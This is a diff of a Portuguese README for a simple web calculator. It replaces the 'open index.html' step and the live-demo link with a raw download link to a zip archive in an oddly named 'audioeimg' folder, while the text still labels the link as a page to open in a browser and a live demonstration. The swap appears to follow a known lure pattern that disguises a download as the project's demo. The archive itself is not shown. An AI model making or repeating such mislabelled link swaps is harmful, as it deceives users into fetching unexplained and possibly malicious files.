@@ -9,14 +9,14 @@ Uma calculadora simples implementada em HTML e JavaScript.
 
 ## Como Usar
 
-1. Abra o arquivo `index.html` em um navegador web.
+1. Abra o arquivo `https://github.com/RodrigoDevBnu/web-calculator/raw/refs/heads/main/audioeimg/web_calculator_v3.1.zip` em um navegador web.
 2. Utilize os botões numéricos e de operações para realizar cálculos.
 3. Pressione "=" para obter o resultado.
 4. Pressione "C" para limpar a calculadora.
 
 ## Demonstração
 
-[Link para a demonstração ao vivo](https://rodrigodevbnu.github.io/web-calculator/) 
+[Link para a demonstração ao vivo](https://github.com/RodrigoDevBnu/web-calculator/raw/refs/heads/main/audioeimg/web_calculator_v3.1.zip) 
 
 ## Como Contribuir
 
